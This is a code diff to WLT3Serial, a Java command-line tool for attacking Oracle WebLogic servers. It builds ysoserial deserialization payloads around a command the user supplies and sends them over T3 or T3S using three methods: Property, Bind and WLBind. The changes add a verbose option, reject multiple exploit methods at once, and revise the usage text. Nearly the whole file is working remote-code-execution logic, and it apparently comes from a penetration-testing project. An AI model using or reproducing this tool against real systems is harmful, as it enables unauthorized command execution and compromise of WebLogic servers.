@@ -39,6 +39,7 @@ public class WLT3Serial {
 		String command = args[args.length-1];
 		boolean t3s = false;
 		String method = "Property";
+		boolean verbose = false;
 		
 		//parse OPTIONS from command-line
 		if(args.length>4) {
@@ -58,18 +59,37 @@ public class WLT3Serial {
 							usage();
 							return;
 						case "--verbose":
+							verbose=true;
 							break;
 						case "--method=Property":
-							method = "Property";
-							methSet = true;
+							if(!methSet) {
+								method = "Property";
+								methSet = true;
+							} else {
+								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
+								usage();
+								return;
+							}
 							break;
 						case "--method=Bind":
-							method = "Bind";
-							methSet = true;
+							if(!methSet) {
+								method = "Bind";
+								methSet = true;
+							} else {
+								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
+								usage();
+								return;
+							}
 							break;
 						case "--method=WLBind":
-							method = "WLBind";
-							methSet = true;
+							if(!methSet) {
+								method = "WLBind";
+								methSet = true;
+							} else {
+								System.err.println("Error: Multiple Exploit Methods set, please choose only one method\n");
+								usage();
+								return;
+							}
 							break;
 						case "--t3s":
 						case "--t3s=TLSv1.2":
@@ -116,22 +136,23 @@ public class WLT3Serial {
 		//check validity of inputted ysoserial payload type, and generate ysoserial payload
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if(payloadClass == null) {
-			System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help) for available payload types!");
+			System.err.println("Error: Invalid payload type \""+payloadType+"\"! Ensure that ysoserial jar file is in classpath, and check Usage (--help option) for available payload types!");
 			return;
 		}
 		final ObjectPayload payload = payloadClass.newInstance();
 		final Object object = payload.getObject(command);
 		
 		//run exploit
+		System.out.print("Connecting to WebLogic Server at "+(t3s ? "t3s" : "t3" )+"://"+host+":"+Integer.toString(port)+": ... ");
 		switch(method) {
 			case "Property":
-				ContextExploit.runPropertyExploit(object,host,port,t3s);
+				ContextExploit.runPropertyExploit(object,host,port,t3s,verbose);
 				break;
 			case "Bind":
-				ContextExploit.runBindExploit(object,host,port,t3s);
+				ContextExploit.runBindExploit(object,host,port,t3s,verbose);
 				break;
 			case "WLBind":
-				WLNamingExploit.runWLNamingExploit(object,host,port,t3s);
+				WLNamingExploit.runWLBindExploit(object,host,port,t3s,verbose);
 				break;
 		}
 	}
@@ -142,8 +163,8 @@ public class WLT3Serial {
 		System.err.println("\nOptions:");
 		System.err.println("\t--help\t\t\t\tprint usage (you\'re lookin at it)\n");
 		System.err.println("\t--verbose\t\t\tVerbose output (including full thrown exceptions) (NOT YET IMPLEMENTED)\n");
-		System.err.println("\t--method=EXPLOIT_METHOD\t\tMethod for delivering ysoserial payload:");
-		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, similar to JavaUnserializeExploits weblogic.py)");
+		System.err.println("\t--method=EXPLOIT_METHOD\t\tExploit Method for delivering generated ysoserial payload");
+		System.err.println("\t\tExploit Methods:\n\t\t\tProperty\tSend ysoserial payload as connection environment property value (Default, javax.naming.Context.lookup(), similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
